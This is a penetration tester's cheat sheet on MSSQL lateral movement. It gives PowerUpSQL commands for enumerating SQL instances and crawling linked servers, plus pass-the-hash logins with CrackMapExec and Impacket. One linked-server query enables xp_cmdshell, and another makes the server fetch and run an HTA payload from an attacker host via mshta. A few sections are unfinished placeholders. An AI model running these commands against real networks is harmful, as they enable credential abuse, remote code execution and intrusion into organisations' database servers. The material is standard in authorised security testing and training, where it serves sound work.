# MSSQL Lateral Movement

## 01 - Powershell

- Retrieving MSSQL SPN and domain

```
PS C:\> Get-SQLInstanceDomain

PS C:\> Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo

PS C:\> Get-SQLServerLinkCrawl -Instance "<IP>.<domain_name>,1433"

PS C:\> Get-SQLConnectionTest -Instance "<IP>.<domain_name>,1433" | fl

PS C:\> Get-SQLServerInfo -Instance "<IP>.<domain_name>,1433"

PS C:\> Get-SQLServerInfo -Instance "<IP>.<domain_name>,1433" -Query "<SQL Queries>"

PS C:\> Get-SQLServerInfo -Instance "<IP>.<domain_name>,1433" -Query "SELECT @@SERVERNAME"
```

## 02 - CrackMapExec

`$ crackmapexec mssql <IP>/<CIDR> -u "<username>" -H "<ntlm_hash>" -d <domain_name>`

## 03 - Impacket

TODO: Fill in this info

`$ mssqlclient.py -windows-auth <domain_name>/<username>@<IP>`

- Pass the Hash

`$ mssqlclient.py`

## 04 - PowerUpSQL

### 4.1 - Invoke-SQLOSCmd

```
PS C:\> impo .\PowerUpSQL.ps1

PS C:\> Invoke-SQLOSCmd -Instance "<IP>.<domain_name>,1433" -Command "<command>" -RawResults
```

### 4.2 - Get-SQLServerLinkCrawl

```
PS C:\> Get-SQLServerLink -Username sa -Password <password> -Instance <domain_name>\<IP> -Verbose

PS C:\> Get-SQLServerLink -Username sa -Password <password> -Instance <domain_name>\<IP> -Query "EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;')"

PS C:\> Get-SQLServerLink -Username sa -Password <password> -Instance <domain_name>\<IP> -Query "exec master..xp_cmdshell 'mshta.exe http://<IP>/shell.hta'"
```

## 05 - Sqsh

`$ pth-sqsh`

---
## References

- [MSSQL for Pentester Abusing Linked Database](https://www.hackingarticles.in/mssql-for-pentester-abusing-linked-database/)

- [SQL Server Link Crawling PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/sql-server-link-crawling-powerupsql/)

- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)